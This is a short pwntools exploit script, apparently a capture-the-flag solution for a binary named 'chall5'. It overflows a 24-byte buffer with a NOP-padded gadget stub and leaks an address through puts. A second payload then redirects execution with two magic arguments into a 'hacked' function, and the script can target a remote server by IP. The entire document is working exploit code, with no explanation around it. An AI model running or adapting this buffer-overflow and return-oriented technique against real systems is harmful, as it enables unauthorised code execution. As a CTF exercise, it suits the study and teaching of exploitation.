from pwn import *


elf =context.binary = ELF('./chall5')
rop=ROP(elf)
context.log_level = 'error'

def start():
    if args.GDB:
        return gdb.debug(elf.path,gdbscript='b *register_name')
    else:
        if args.REMOTE:
            return remote('207.154.255.198' ,1111)
        else:
            return process()  
        

offset =24
shell=asm('''
            pop rdi;
            pop rsi;
            ret;
            ''',arch='amd64')


pay =flat(
    shell.rjust(24,b'\x90'),
    elf.plt['puts'],
    elf.symbols['main'],
)



p=start()


p.sendline(pay)

p.recvline()
p.recvline()
x=u64(p.recvline().strip().ljust(8,b'\x00'))
print(hex(x))
x=x+0x15

pay =flat(
    shell.rjust(24,b'\x90'),
    x,
    0xdeadbeefdeadbeef,
    0xc0debabec0debabe,
    elf.symbols['hacked'],
)

p.sendline(pay)

p.interactive()


